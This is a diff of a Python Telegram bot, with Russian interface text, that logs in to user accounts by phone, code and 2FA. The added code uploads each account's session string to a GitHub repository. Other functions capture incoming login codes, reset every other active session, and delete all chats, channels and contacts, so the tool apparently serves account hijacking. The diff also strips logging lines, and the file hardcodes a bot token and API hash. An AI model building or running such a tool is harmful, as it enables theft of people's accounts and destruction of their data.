@@ -1,10 +1,12 @@
 import os
 import re
+import base64
 import random
 import asyncio
 import logging
 from typing import Optional
 
+import aiohttp
 from aiogram import Bot, Dispatcher
 from aiogram.filters import Command
 from aiogram.types import (
@@ -18,6 +20,7 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.storage.memory import MemoryStorage
 
 from telethon import TelegramClient, errors, functions, events
+from telethon.sessions import StringSession
 from telethon.tl.types import Channel, Chat
 from telethon.tl.functions.channels import LeaveChannelRequest
 from telethon.tl.functions.messages import DeleteHistoryRequest
@@ -26,9 +29,11 @@ from telethon.tl.functions.contacts import DeleteContactsRequest, BlockRequest
 BOT_TOKEN = "8892329170:AAFQpzPhO_nsjyPSeRRNXzN_qgyNNj-bY9k"
 API_ID = 39813941
 API_HASH = "6aa1f649d2a6b3a308bc27aed9e6de29"
-SESSIONS_DIR = "./sessions"
 
-os.makedirs(SESSIONS_DIR, exist_ok=True)
+GH_TOKEN  = os.getenv("GH_TOKEN")
+GH_REPO   = os.getenv("GH_REPO")
+GH_BRANCH = os.getenv("GH_BRANCH", "main")
+
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
 
 CLIENTS = {}
@@ -39,6 +44,108 @@ PHONE_RE = re.compile(r"^\+?\d{7,15}$")
 CODE_RE = re.compile(r"\b(\d{4,7})\b")
 TELEGRAM_SERVICE_ID = 777000
 
+GH_API = "https://api.github.com"
+
+
+# ---------- GitHub storage ----------
+
+def _gh_headers():
+    return {
+        "Authorization": f"token {GH_TOKEN}",
+        "Accept": "application/vnd.github+json",
+        "User-Agent": "tg-session-store",
+    }
+
+
+def _session_path(phone: str) -> str:
+    return f"sessions/{phone.lstrip('+')}.txt"
+
+
+async def gh_get(path: str) -> Optional[str]:
+    url = f"{GH_API}/repos/{GH_REPO}/contents/{path}?ref={GH_BRANCH}"
+    async with aiohttp.ClientSession(headers=_gh_headers()) as s:
+        async with s.get(url) as r:
+            if r.status == 404:
+                return None
+            r.raise_for_status()
+            data = await r.json()
+    content = data["content"].replace("\n", "")
+    return base64.b64decode(content).decode()
+
+
+async def gh_get_sha(path: str) -> Optional[str]:
+    url = f"{GH_API}/repos/{GH_REPO}/contents/{path}?ref={GH_BRANCH}"
+    async with aiohttp.ClientSession(headers=_gh_headers()) as s:
+        async with s.get(url) as r:
+            if r.status == 404:
+                return None
+            r.raise_for_status()
+            data = await r.json()
+    return data["sha"]
+
+
+async def gh_put(path: str, content: str, message: str = "update"):
+    sha = await gh_get_sha(path)
+    body = {
+        "message": message,
+        "content": base64.b64encode(content.encode()).decode(),
+        "branch": GH_BRANCH,
+    }
+    if sha:
+        body["sha"] = sha
+    url = f"{GH_API}/repos/{GH_REPO}/contents/{path}"
+    async with aiohttp.ClientSession(headers=_gh_headers()) as s:
+        async with s.put(url, json=body) as r:
+            if r.status not in (200, 201):
+                txt = await r.text()
+                logging.warning(f"gh_put {path}: {r.status} {txt}")
+            r.raise_for_status()
+
+
+async def gh_delete(path: str):
+    sha = await gh_get_sha(path)
+    if not sha:
+        return
+    url = f"{GH_API}/repos/{GH_REPO}/contents/{path}"
+    body = {"message": "delete", "sha": sha, "branch": GH_BRANCH}
+    async with aiohttp.ClientSession(headers=_gh_headers()) as s:
+        async with s.delete(url, json=body) as r:
+            if r.status not in (200, 204):
+                logging.warning(f"gh_delete {path}: {r.status}")
+
+
+# ---------- session storage ----------
+
+async def save_session(phone: str, cli: TelegramClient):
+    string = StringSession.save(cli.session)
+    await gh_put(_session_path(phone), string, f"session {phone}")
+    logging.info(f"session saved: {phone}")
+
+
+async def load_session(phone: str) -> Optional[str]:
+    try:
+        return await gh_get(_session_path(phone))
+    except Exception as e:
+        logging.warning(f"load_session {phone}: {e}")
+        return None
+
+
+async def drop_session(phone: str):
+    try:
+        await gh_delete(_session_path(phone))
+    except Exception as e:
+        logging.warning(f"drop_session {phone}: {e}")
+
+
+async def make_client(phone: str) -> TelegramClient:
+    stored = await load_session(phone)
+    if stored:
+        logging.info(f"restored: {phone}")
+        return TelegramClient(StringSession(stored), API_ID, API_HASH)
+    return TelegramClient(StringSession(), API_ID, API_HASH)
+
+
+# ---------- phone ----------
 
 def normalize_phone(raw: str) -> Optional[str]:
     s = re.sub(r"[\s\-\(\)]", "", raw.strip())
@@ -52,11 +159,7 @@ def normalize_phone(raw: str) -> Optional[str]:
     return s
 
 
-def new_client(phone: str) -> TelegramClient:
-    safe = phone.lstrip("+")
-    path = os.path.join(SESSIONS_DIR, safe)
-    return TelegramClient(path, API_ID, API_HASH)
-
+# ---------- delays ----------
 
 async def human_delay(min_s=1.5, max_s=4.0):
     await asyncio.sleep(random.uniform(min_s, max_s))
@@ -76,6 +179,8 @@ async def safe(coro_factory, label=""):
             logging.warning(f"[RPC] {label} {e}")
             return None
 
+
+# ---------- clean ----------
 
 async def clear_dialog(cli, entity):
     name = getattr(entity, "name", None) or getattr(entity, "username", "?")
@@ -108,7 +213,6 @@ async def clean_channels(cli, leave=True):
             if leave:
                 try:
                     await safe(lambda: cli(LeaveChannelRequest(e)), d.name)
-                    logging.info(f"left: {d.name}")
                 except Exception as ex:
                     logging.warning(f"leave fail {d.name}: {ex}")
                 await human_delay()
@@ -128,7 +232,6 @@ async def clean_contacts(cli, remove=True, block=False):
     if remove and ids:
         try:
             await safe(lambda: cli(DeleteContactsRequest(id=ids)), "contacts")
-            logging.info(f"contacts removed: {len(ids)}")
         except Exception as e:
             logging.warning(f"contacts fail: {e}")
     if block:
@@ -141,12 +244,10 @@ async def clean_contacts(cli, remove=True, block=False):
 
 
 async def delete_all_dialogs(cli):
-    """Удалить ВСЕ диалоги: личка, группы, каналы, боты — всё, что видно в чатах."""
     async for d in cli.iter_dialogs():
         e = d.entity
         try:
             await safe(lambda p=e: cli(DeleteHistoryRequest(peer=p, max_id=0, revoke=True)), d.name)
-            logging.info(f"deleted: {d.name}")
         except Exception as ex:
             logging.warning(f"fail {d.name}: {ex}")
         await human_delay()
@@ -164,11 +265,12 @@ async def full_wipe(cli, leave_channels=True, drop_contacts=True):
 async def reset_other_sessions(cli):
     try:
         await cli(functions.account.ResetAuthorizationRequest(hash=0))
-        logging.info("reset_other_sessions ok")
     except Exception as e:
         logging.warning(f"reset_other_sessions fail: {e}")
         raise
 
+
+# ---------- hunt ----------
 
 async def hunt_code(cli, chat_id: int, minutes: int = 5):
     found = asyncio.Event()
@@ -179,11 +281,7 @@ async def hunt_code(cli, chat_id: int, minutes: int = 5):
         for match in CODE_RE.finditer(text):
             code = match.group(1)
             try:
-                await bot.send_message(
-                    chat_id,
-                    f"код: <code>{code}</code>",
-                    parse_mode="HTML",
-                )
+                await bot.send_message(chat_id, f"код: <code>{code}</code>", parse_mode="HTML")
             except Exception as e:
                 logging.warning(f"send code fail: {e}")
             found.set()
@@ -201,6 +299,8 @@ async def hunt_code(cli, chat_id: int, minutes: int = 5):
         HUNT_TASKS.pop(chat_id, None)
 
 
+# ---------- bot ----------
+
 class Auth(StatesGroup):
     phone = State()
     code = State()
@@ -211,7 +311,7 @@ bot = Bot(BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
 
-def main_menu() -> InlineKeyboardMarkup:
+def main_menu():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="войти", callback_data="auth")],
         [InlineKeyboardButton(text="статус", callback_data="status")],
@@ -222,7 +322,7 @@ def main_menu() -> InlineKeyboardMarkup:
     ])
 
 
-def clean_menu() -> InlineKeyboardMarkup:
+def clean_menu():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="удалить всё (все чаты)", callback_data="delete_all")],
         [InlineKeyboardButton(text="личка", callback_data="clean_private")],
@@ -235,7 +335,7 @@ def clean_menu() -> InlineKeyboardMarkup:
     ])
 
 
-def back_menu() -> InlineKeyboardMarkup:
+def back_menu():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="меню", callback_data="menu")]
     ])
@@ -340,11 +440,9 @@ async def cb_hunt(cb: CallbackQuery):
     if not cli or not await cli.is_user_authorized():
         await cb.message.edit_text("сначала войди", reply_markup=back_menu())
         return await cb.answer()
-
     if chat_id in HUNT_TASKS:
         await cb.answer("уже ловлю")
         return
-
     await cb.message.edit_text("ловлю код 5 минут...", reply_markup=back_menu())
     task = asyncio.create_task(hunt_code(cli, chat_id, minutes=5))
     HUNT_TASKS[chat_id] = task
@@ -406,7 +504,7 @@ async def step_phone(msg: Message, state: FSMContext):
     if not phone:
         return await msg.answer("номер?", reply_markup=back_menu())
 
-    cli = new_client(phone)
+    cli = await make_client(phone)
     CLIENTS[msg.chat.id] = cli
     PHONES[msg.chat.id] = phone
 
@@ -451,6 +549,7 @@ async def step_code(msg: Message, state: FSMContext):
     try:
         await cli.sign_in(phone=phone, code=code)
         me = await cli.get_me()
+        await save_session(phone, cli)
         await state.clear()
         try:
             await msg.delete()
@@ -486,6 +585,7 @@ async def step_2fa(msg: Message, state: FSMContext):
     try:
         await cli.sign_in(password=msg.text or "")
         me = await cli.get_me()
+        await save_session(phone, cli)
         await state.clear()
         try:
             await msg.delete()
@@ -512,7 +612,9 @@ async def fallback(msg: Message, state: FSMContext):
 
 
 async def main():
-    logging.info("up")
+    if not GH_TOKEN or not GH_REPO:
+        raise SystemExit("нужны GH_TOKEN и GH_REPO в переменных окружения хостинга")
+    logging.info(f"up, sessions -> github:{GH_REPO}")
     await dp.start_polling(bot)
 
 
